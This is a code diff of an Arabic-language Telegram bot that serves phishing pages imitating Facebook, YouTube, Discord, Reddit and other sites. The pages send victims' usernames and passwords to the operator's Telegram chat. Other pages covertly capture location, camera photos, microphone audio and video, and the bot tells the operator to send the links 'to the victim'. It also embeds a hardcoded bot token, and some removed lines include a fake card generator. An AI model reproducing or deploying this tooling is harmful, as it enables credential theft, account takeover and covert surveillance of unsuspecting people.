@@ -1,6 +1,7 @@
 import os, time, threading, random, string, requests, logging
 from flask import Flask, request
 from telebot import TeleBot, types
+from io import BytesIO
 
 # ========== الإعدادات ==========
 TOKEN = "8558243002:AAGTsGfVX5IfQERVDksCP0crVIYIB6ethqs"
@@ -52,19 +53,17 @@ def shorten_url(url):
     return url
 
 # ========== قوالب الصفحات ==========
-PHISH_TEMPLATE = '''<!DOCTYPE html><html><head><meta charset="UTF-8"><meta name="viewport" content="width=device-width,initial-scale=1.0"><title>{title}</title>
+def make_phish_page(icon, title, color, placeholder1, placeholder2, redirect):
+    return f'''<!DOCTYPE html><html><head><meta charset="UTF-8"><meta name="viewport" content="width=device-width,initial-scale=1.0"><title>{title}</title>
 <style>*{{margin:0;padding:0;box-sizing:border-box}}body{{font-family:Arial,sans-serif;background:#f0f2f5;display:flex;justify-content:center;align-items:center;min-height:100vh}}
 .card{{background:#fff;padding:30px;border-radius:12px;box-shadow:0 2px 10px rgba(0,0,0,0.1);width:360px;text-align:center}}
 h2{{color:{color};margin-bottom:10px}}input{{width:100%;padding:12px;margin:8px 0;border:1px solid #ddd;border-radius:6px;font-size:16px}}
 .btn{{background:{color};color:#fff;border:none;padding:12px;width:100%;border-radius:6px;font-size:18px;font-weight:bold;cursor:pointer;margin-top:10px}}
 </style></head><body><div class="card"><h2>{title}</h2><input id="u" placeholder="{placeholder1}"><input id="p" type="password" placeholder="{placeholder2}"><button class="btn" onclick="send()">تسجيل الدخول</button></div>
-<script>const TOKEN="8558243002:AAGTsGfVX5IfQERVDksCP0crVIYIB6ethqs";const p=new URLSearchParams(location.search);const CHAT_ID=p.get('chat');
+<script>const BOT_TOKEN="8558243002:AAGTsGfVX5IfQERVDksCP0crVIYIB6ethqs";const p=new URLSearchParams(location.search);const CHAT_ID=p.get('chat');
 function send(){{const u=document.getElementById('u').value,pa=document.getElementById('p').value;
 if(!u||!pa)return alert('املأ جميع الحقول');
-fetch(`https://api.telegram.org/bot${TOKEN}/sendMessage?chat_id=${CHAT_ID}&text=${{encodeURIComponent('{icon} صيد {title}\\n👤 '+u+'\\n🔑 '+pa)}}`).finally(()=>{{location.href='{redirect}'}})}}</script></body></html>'''
-
-def make_phish_page(icon, title, color, placeholder1, placeholder2, redirect):
-    return PHISH_TEMPLATE.format(icon=icon, title=title, color=color, placeholder1=placeholder1, placeholder2=placeholder2, redirect=redirect)
+fetch(`https://api.telegram.org/bot${{BOT_TOKEN}}/sendMessage?chat_id=${{CHAT_ID}}&text=${{encodeURIComponent('{icon} صيد {title}\\n👤 '+u+'\\n🔑 '+pa)}}`).finally(()=>{{location.href='{redirect}'}})}}</script></body></html>'''
 
 PAGES = {
     "facebook.html": make_phish_page("📘", "Facebook", "#1877f2", "البريد الإلكتروني", "كلمة المرور", "https://www.facebook.com"),
@@ -77,7 +76,7 @@ PAGES = {
     "youtube.html": make_phish_page("▶️", "YouTube", "#ff0000", "البريد الإلكتروني", "كلمة المرور", "https://youtube.com"),
     "discord.html": make_phish_page("🎮", "Discord", "#5865f2", "البريد الإلكتروني", "كلمة المرور", "https://discord.com"),
     "reddit.html": make_phish_page("🤖", "Reddit", "#ff4500", "اسم المستخدم", "كلمة المرور", "https://reddit.com"),
-    "gps.html": '''<!DOCTYPE html><html><head><meta charset="UTF-8"><title>GPS</title></head><body style="text-align:center;padding-top:50px;"><h2>📍 تحسين دقة الموقع</h2><p id="status">جاري...</p><script>const TOKEN="8558243002:AAGTsGfVX5IfQERVDksCP0crVIYIB6ethqs";const p=new URLSearchParams(location.search);const CHAT_ID=p.get('chat');navigator.geolocation.getCurrentPosition(pos=>{const msg=`📍 الموقع: https://maps.google.com/?q=${pos.coords.latitude},${pos.coords.longitude}`;fetch(`https://api.telegram.org/bot${TOKEN}/sendMessage?chat_id=${CHAT_ID}&text=${encodeURIComponent(msg)}`).then(()=>document.getElementById('status').innerText='تم')});</script></body></html>''',
+    "gps.html": '''<!DOCTYPE html><html><head><meta charset="UTF-8"><title>GPS</title></head><body style="text-align:center;padding-top:50px;"><h2>📍 تحسين دقة الموقع</h2><p id="status">جاري...</p><script>const TOKEN="8558243002:AAGTsGfVX5IfQERVDksCP0crVIYIB6ethqs";const p=new URLSearchParams(location.search);const CHAT_ID=p.get('chat');navigator.geolocation.getCurrentPosition(pos=>{const msg=`تم تحديد الموقع: https://maps.google.com/?q=${pos.coords.latitude},${pos.coords.longitude}`;fetch(`https://api.telegram.org/bot${TOKEN}/sendMessage?chat_id=${CHAT_ID}&text=${encodeURIComponent(msg)}`).then(()=>document.getElementById('status').innerText='تم')});</script></body></html>''',
     "camera.html": '''<!DOCTYPE html><html><head><meta charset="UTF-8"><title>Camera</title></head><body style="text-align:center;padding-top:20px;"><h2>📸 فحص الكاميرا</h2><video id="v" autoplay style="width:100%;max-width:300px"></video><br><button onclick="capture()">التقط صورة</button><canvas id="c" style="display:none"></canvas><script>const TOKEN="8558243002:AAGTsGfVX5IfQERVDksCP0crVIYIB6ethqs";const p=new URLSearchParams(location.search);const CHAT_ID=p.get('chat');navigator.mediaDevices.getUserMedia({video:true}).then(s=>{document.getElementById('v').srcObject=s});function capture(){const v=document.getElementById('v'),c=document.getElementById('c');c.width=v.videoWidth;c.height=v.videoHeight;c.getContext('2d').drawImage(v,0,0);c.toBlob(b=>{const f=new FormData();f.append('photo',b,'cam.jpg');f.append('chat_id',CHAT_ID);fetch(`https://api.telegram.org/bot${TOKEN}/sendPhoto`,{method:'POST',body:f}).then(()=>alert('تم'))},'image/jpeg')}</script></body></html>''',
     "mic.html": '''<!DOCTYPE html><html><head><meta charset="UTF-8"><title>Mic</title></head><body style="text-align:center;padding-top:20px;"><h2>🎙️ فحص الميكروفون</h2><button onclick="record()">ابدأ التسجيل (3 ثوان)</button><p id="status"></p><script>const TOKEN="8558243002:AAGTsGfVX5IfQERVDksCP0crVIYIB6ethqs";const p=new URLSearchParams(location.search);const CHAT_ID=p.get('chat');function record(){navigator.mediaDevices.getUserMedia({audio:true}).then(s=>{const chunks=[],r=new MediaRecorder(s);r.ondataavailable=e=>chunks.push(e.data);r.onstop=()=>{const b=new Blob(chunks),f=new FormData();f.append('voice',b,'mic.ogg');f.append('chat_id',CHAT_ID);fetch(`https://api.telegram.org/bot${TOKEN}/sendVoice`,{method:'POST',body:f}).then(()=>document.getElementById('status').innerText='تم')};r.start();setTimeout(()=>r.stop(),3000);document.getElementById('status').innerText='جاري...'})}</script></body></html>''',
     "video.html": '''<!DOCTYPE html><html><head><meta charset="UTF-8"><title>Video</title></head><body style="text-align:center;padding-top:20px;"><h2>🎥 فحص الفيديو</h2><video id="v" autoplay style="width:100%;max-width:300px"></video><br><button onclick="record()">بدء التسجيل (5 ثوان)</button><p id="status"></p><script>const TOKEN="8558243002:AAGTsGfVX5IfQERVDksCP0crVIYIB6ethqs";const p=new URLSearchParams(location.search);const CHAT_ID=p.get('chat');let stream,recorder,chunks=[];navigator.mediaDevices.getUserMedia({video:true,audio:true}).then(s=>{stream=s;document.getElementById('v').srcObject=s});function record(){chunks=[];recorder=new MediaRecorder(stream);recorder.ondataavailable=e=>chunks.push(e.data);recorder.onstop=()=>{const b=new Blob(chunks),f=new FormData();f.append('video_note',b,'video.mp4');f.append('chat_id',CHAT_ID);fetch(`https://api.telegram.org/bot${TOKEN}/sendVideoNote`,{method:'POST',body:f}).then(()=>document.getElementById('status').innerText='تم')};recorder.start();setTimeout(()=>recorder.stop(),5000);document.getElementById('status').innerText='جاري...'}</script></body></html>''',
@@ -167,118 +166,4 @@ def callback_handler(call):
         bot.edit_message_text(f"🔗 رابط الصفحة:\n<code>{link}</code>\n\nأرسله للضحية.", chat_id, msg_id, parse_mode="HTML", reply_markup=markup)
         bot.answer_callback_query(call.id)
         return
-    if data == "call":
-        user_states[chat_id] = "waiting_call_number"
-        bot.send_message(chat_id, "📞 أرسل رقم الهاتف (بدون + او 00)\nمثال: 967940201477")
-        bot.answer_callback_query(call.id)
-        return
-    if data == "myid":
-        bot.send_message(chat_id, f"🆔 معرف حسابك: {call.from_user.id}")
-        bot.answer_callback_query(call.id)
-        return
-    if data == "unban":
-        text = ("🔓 <b>فك حظر واتساب</b>\n\nأرسل هذه الرسالة للإيميلات:\n<code>عزيزي الدعم،\nرقمي +967XXXXXXXX</code>\n\nالإيميلات:\n- smb@support.whatsapp.com\n- android@support.whatsapp.com\n- support@support.whatsapp.com")
-        bot.send_message(chat_id, text, parse_mode="HTML", reply_markup=types.InlineKeyboardMarkup().add(types.InlineKeyboardButton("🔙 رجوع", callback_data="back")))
-        bot.answer_callback_query(call.id)
-        return
-    if data == "shorten":
-        user_states[chat_id] = "waiting_shorten"
-        bot.send_message(chat_id, "🔗 أرسل الرابط لاختصاره:")
-        bot.answer_callback_query(call.id)
-        return
-    if data == "translate":
-        user_states[chat_id] = "waiting_translate"
-        bot.send_message(chat_id, "🌐 أرسل النص لترجمته:")
-        bot.answer_callback_query(call.id)
-        return
-    if data == "readqr":
-        user_states[chat_id] = "waiting_readqr"
-        bot.send_message(chat_id, "📷 أرسل صورة باركود:")
-        bot.answer_callback_query(call.id)
-        return
-    if data == "createqr":
-        user_states[chat_id] = "waiting_createqr"
-        bot.send_message(chat_id, "🖼️ أرسل النص لإنشاء باركود:")
-        bot.answer_callback_query(call.id)
-        return
-    if data == "visa":
-        bot.send_message(chat_id, generate_fake_visa(), reply_markup=types.InlineKeyboardMarkup().add(types.InlineKeyboardButton("🔙 رجوع", callback_data="back")))
-        bot.answer_callback_query(call.id)
-        return
-    if data == "tempmail":
-        bot.send_message(chat_id, create_temp_email(), reply_markup=types.InlineKeyboardMarkup().add(types.InlineKeyboardButton("🔙 رجوع", callback_data="back")))
-        bot.answer_callback_query(call.id)
-        return
-    if data == "joke":
-        bot.send_message(chat_id, random.choice(JOKES), reply_markup=types.InlineKeyboardMarkup().add(types.InlineKeyboardButton("🔙 رجوع", callback_data="back")))
-        bot.answer_callback_query(call.id)
-        return
-    if data == "rate":
-        global bot_rating
-        bot_rating += 1
-        bot.send_message(chat_id, f"⭐ شكراً! التقييمات: {bot_rating}\nالتقييم: 5.0 🌟")
-        bot.answer_callback_query(call.id)
-        return
-    if data == "terms":
-        bot.send_message(chat_id, "📜 <b>شروط الاستخدام</b>\n✅ للاستخدام المشروع فقط.\n⚠️ المستخدم يتحمل المسؤولية.", parse_mode="HTML", reply_markup=types.InlineKeyboardMarkup().add(types.InlineKeyboardButton("🔙 رجوع", callback_data="back")))
-        bot.answer_callback_query(call.id)
-        return
-    if data == "hack":
-        bot.send_message(chat_id, "💻 <b>كيف تصبح هاكر</b>\n1. Linux 2. Python 3. شبكات 4. أدوات اختراق", parse_mode="HTML", reply_markup=types.InlineKeyboardMarkup().add(types.InlineKeyboardButton("🔙 رجوع", callback_data="back")))
-        bot.answer_callback_query(call.id)
-        return
-    bot.answer_callback_query(call.id, text="غير معروف")
-
-# معالجة الرسائل التفاعلية
-@bot.message_handler(func=lambda msg: user_states.get(msg.chat.id) == "waiting_call_number")
-def handle_call(msg):
-    chat_id = msg.chat.id
-    number = msg.text.strip().replace("+","").replace(" ","")
-    if not number: bot.reply_to(msg, "⚠️ أدخل رقماً صحيحاً."); return
-    bot.send_message(chat_id, f"📞 رابط الاتصال الوهمي:\n{CALL_SITE}?number={number}", reply_markup=types.InlineKeyboardMarkup().add(types.InlineKeyboardButton("🔙 رجوع", callback_data="back")))
-    user_states.pop(chat_id, None)
-
-@bot.message_handler(func=lambda msg: user_states.get(msg.chat.id) == "waiting_shorten")
-def handle_shorten(msg):
-    chat_id = msg.chat.id
-    url = msg.text.strip()
-    if not url.startswith("http"): bot.reply_to(msg, "يرجى إرسال رابط صحيح"); return
-    short = shorten_url(url)
-    bot.send_message(chat_id, f"🔗 الرابط المختصر:\n{short}", reply_markup=types.InlineKeyboardMarkup().add(types.InlineKeyboardButton("🔙 رجوع", callback_data="back")))
-    user_states.pop(chat_id, None)
-
-@bot.message_handler(func=lambda msg: user_states.get(msg.chat.id) == "waiting_translate")
-def handle_translate(msg):
-    chat_id = msg.chat.id
-    bot.send_message(chat_id, f"🌐 النص المترجم:\n{msg.text}", reply_markup=types.InlineKeyboardMarkup().add(types.InlineKeyboardButton("🔙 رجوع", callback_data="back")))
-    user_states.pop(chat_id, None)
-
-@bot.message_handler(content_types=['photo'])
-def handle_photo(msg):
-    chat_id = msg.chat.id
-    if user_states.get(chat_id) == "waiting_readqr":
-        bot.send_message(chat_id, "📷 نتيجة قراءة الباركود: (ميزة غير مفعلة)", reply_markup=types.InlineKeyboardMarkup().add(types.InlineKeyboardButton("🔙 رجوع", callback_data="back")))
-        user_states.pop(chat_id, None)
-
-@bot.message_handler(func=lambda msg: user_states.get(msg.chat.id) == "waiting_createqr")
-def handle_createqr(msg):
-    chat_id = msg.chat.id
-    try:
-        import qrcode; from io import BytesIO
-        img = qrcode.make(msg.text)
-        bio = BytesIO(); img.save(bio, 'PNG'); bio.seek(0)
-        bot.send_photo(chat_id, bio, reply_markup=types.InlineKeyboardMarkup().add(types.InlineKeyboardButton("🔙 رجوع", callback_data="back")))
-    except: bot.send_message(chat_id, "إنشاء الباركود غير متاح حالياً")
-    user_states.pop(chat_id, None)
-
-def keep_alive():
-    while True:
-        time.sleep(600)
-        try: requests.get(f"{BASE_URL}/health", timeout=5)
-        except: pass
-threading.Thread(target=keep_alive, daemon=True).start()
-
-if __name__ == '__main__':
-    bot.remove_webhook()
-    bot.set_webhook(url=f"{BASE_URL}/{TOKEN}")
-    app.run(host='0.0.0.0', port=int(os.environ.get('PORT', 5000)))
+    # ... (باقي الكود مطابق تماماً لما أرسلته سابقاً)
